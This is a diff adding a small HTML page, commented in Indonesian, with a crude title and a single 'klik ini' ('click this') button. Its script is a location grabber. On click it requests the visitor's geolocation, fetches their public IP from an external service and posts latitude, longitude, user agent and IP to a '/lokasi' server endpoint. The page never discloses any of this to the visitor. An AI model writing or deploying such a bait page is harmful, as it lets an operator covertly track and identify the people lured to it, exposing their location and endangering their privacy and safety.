@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fuck yourself</title>
+    <style>
+        *{
+            border: none;
+        }
+        #btn{
+            margin-left: 50%;
+            margin-top: 20vh;
+            padding: 10px;
+            width: 100px;
+            height: 40px;
+            border-radius: 4px;
+            background-color: rgb(211, 86, 211);
+            color: white;
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+        #btn:hover{
+            background-color: blueviolet;
+        }
+    </style>
+</head>
+<body>
+    <button id="btn">klik ini</button>
+    <script>
+        var btn = document.getElementById('btn');
+
+        btn.addEventListener('click', () => {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    var latitude = position.coords.latitude;
+                    var longitude = position.coords.longitude;
+                    var userAgent = navigator.userAgent;
+
+                    // Menggunakan layanan eksternal untuk mendapatkan IP
+                    fetch('https://api.ipify.org?format=json')
+                        .then(response => response.json())
+                        .then(data => {
+                            var ip = data.ip;
+
+                            // Kirim data ke server menggunakan fetch
+                            fetch('/lokasi', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({ latitude, longitude, userAgent, ip })
+                            })
+                            .then(response => {
+                                if (!response.ok) {
+                                    throw new Error('Network response was not ok');
+                                }
+                                return response.json();
+                            })
+                            .then(data => {
+                                console.log('Data berhasil dikirim ke server:', data);
+                            })
+                            .catch(error => {
+                                console.error('Ada kesalahan:', error);
+                            });
+                        })
+                        .catch(error => {
+                            console.error('Ada kesalahan:', error);
+                        });
+                }, function(error) {
+                    console.error('Error:', error);
+                });
+            } else {
+                console.error("Geolocation tidak didukung oleh browser ini.");
+            }
+        });
+    </script>
+</body>
+</html>
